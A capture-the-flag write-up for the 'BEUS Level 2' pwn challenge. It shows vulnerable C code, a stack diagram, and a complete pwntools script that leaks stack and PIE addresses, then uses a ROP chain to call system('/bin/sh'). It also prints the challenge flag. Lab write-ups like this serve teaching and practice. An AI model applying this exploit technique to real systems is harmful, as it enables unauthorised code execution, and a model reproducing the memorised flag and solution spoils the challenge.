# PWN - BEUS Level 2
**Author** : Lazar Mancic  
**Difficulty**: <font color='red'>Hard</font>  
**Description**: Congratulations, you passed Level 1, but are you ready for Level 2?

**External resources**:
- `pwn_beus_level2.zip` - [Download](public/pwn_beus_level2.zip)

**Flag**: ``SCC{r34d1n6_w17h_r34d_15n'7_5m4r7_4f73r_4ll}``

# Writeup

## Enumeration

This challenge contains the same **Buffer Overflow** vulnerability as in [Level 1](../pwn_beus_level1/README.md), but there is an additional vulnerability in this case.

New questions also contain hints within them.
```c
const char* questions[] = {
    "What randomizes memory addresses to prevent predictability?",
    "What makes executables independent of memory address?",
    "What refers to small code chunks in binary?",
    "Does the `read` function require a newline at the end of input?",
    "What vulnerability reveals secret memory addresses?"
};

const char* answers[] = {
    "ASLR", "PIE", "Gadgets", "No", "Memory Leak"
};
```
From this, we gather the idea to look for memory leak vulnerabilities, and also that the `read` function doesn't require a newline at the end of input. That’s the key observation.
```c
char ans[128];
char yesno;

printf("[?] Q%d: %s\n", i+1, questions[i]);
while(true) {
    printf("Answer> ");
    read(0, ans, 152);
    ans[strcspn(ans, "\n")] = '\0';

    printf("Is your answer '%s'? [y/n]> ", ans);
    yesno = getchar();
    getchar();
    if(yesno == 'y') break;
}
```
In addition to the memory leak, there is a buffer overflow vulnerability. While it can be used to overflow the return address, it can also be used to leak it. If we send input without a newline, it will print the content after the input, allowing us to leak some addresses.

## Exploitation

The first part of exploitation is obtaining the leaks.  
We have this stack layout.
```
┏━━━━━━━━━━━━━━━━━━━━━━┓ <- rsp (Stack Pointer)
┃ char buf[128]        ┃
┃                      ┃
┃                      ┃
┃                      ┃
┃                      ┃
┃                      ┃
┃                      ┃
┠┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┨ <- rsp+0x80
┃ align 0x8            ┃
┠┄┄┄┄┄┄┄┄┄┄┄┬┄┄┄┄┄┄┄┄┄┄┨ <- rsp+0x88
┃ align 0x4 ┆   int i  ┃
┠┄┄┄┄┄┄┄┄┄┄┄┴┄┄┄┄┄┄┄┄┄┄┨ <- rsp+0x90
┃ stored rbp           ┃
┠┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┨ <- rsp+0x98
┃ return address       ┃
┗━━━━━━━━━━━━━━━━━━━━━━┛
```
First, we get the stack leak by filling the buffer without a newline until we reach the stored `rbp`.
```py
payload = b"A" * 144
p.sendafter(b"Answer> ", payload)
```
```
┏━━━━━━━━━━━━━━━━━━━━━━┓ <- rsp (Stack Pointer)
┃   A A A A A A A A    ┃
┃   A A A A A A A A    ┃
┃   A A A A A A A A    ┃
┃         ...          ┃
┃   A A A A A A A A    ┃
┃   A A A A A A A A    ┃
┃   A A A A A A A A    ┃
┠┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┨ <- rsp+0x80
┃   A A A A A A A A    ┃
┠┄┄┄┄┄┄┄┄┄┄┄┬┄┄┄┄┄┄┄┄┄┄┨ <- rsp+0x88
┃  A A A A  ┆ A A A A  ┃
┠┄┄┄┄┄┄┄┄┄┄┄┴┄┄┄┄┄┄┄┄┄┄┨ <- rsp+0x90
┃ stored rbp           ┃
┠┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┨ <- rsp+0x98
┃ return address       ┃
┗━━━━━━━━━━━━━━━━━━━━━━┛
```
Printing it will result in printing the stored `rbp`, and the same applies to the return address.  

Once we have the leaks, we use gadgets to call `system` with our argument. We can place `/bin/sh` on the stack and use it as an argument for the `system` function.  
The first argument on *x86_64* is stored in the `rdi` register, so we search for a gadget that allows us to control it.
```
$ ROPgadget --binary beus2 | grep "pop rdi"
0x000000000000151b : pop rdi ; ret
```
Finally, we combine the gadgets into a functional chain. The `ret` instruction is used for stack alignment.
```py
payload = flat(
    b"A" * 152,
    pop_rdi,
    rbp_leak + 0x28,
    ret,
    elf.plt.system,
    b"/bin/sh\x00"
)

p.sendlineafter(b"comment> ", payload)
```

## Solution

```py
from pwn import *

HOST = args.HOST or "localhost"
PORT = int(args.PORT or "1337")

context.log_level = 'ERROR'

if args.REMOTE:
    p = remote(HOST, PORT)
else:
    p = process("./beus2")
elf = context.binary = ELF("./beus2")

anss = [b"aslr\0", b"pie\0", b"gadgets\0", b"no\0", b"memory leak\0"]

payload = b"A" * 144
p.sendafter(b"Answer> ", payload)

p.recvuntil(payload)
rbp_leak = u64(p.recv(6) + b"\x00\x00")
p.sendlineafter(b"]> ", b"n")

log.success(f"Stack leak : {rbp_leak:#x}")

payload = b"A" * 152
p.sendafter(b"Answer> ", payload)

p.recvuntil(payload)
pie_leak = u64(p.recv(6) + b"\x00\x00") - 0x1336
p.sendlineafter(b"]> ", b"n")

log.success(f"PIE leak : {pie_leak:#x}")
elf.address = pie_leak

anss[0] = flat(
    anss[0],
    b"A" * (144 - len(anss[0])),
    rbp_leak
)

for ans in anss:
    p.sendafter(b"Answer> ", ans)
    p.sendlineafter(b"]> ", b"y")

pop_rdi = pie_leak + 0x151b
ret = pie_leak + 0x1016

payload = flat(
    b"A" * 152,
    pop_rdi,
    rbp_leak + 0x28,
    ret,
    elf.plt.system,
    b"/bin/sh\x00"
)

p.sendlineafter(b"comment> ", payload)

p.recvline()
p.sendline(b"cat flag")

flag = p.recvline(False).decode()

print(flag)
p.close()
```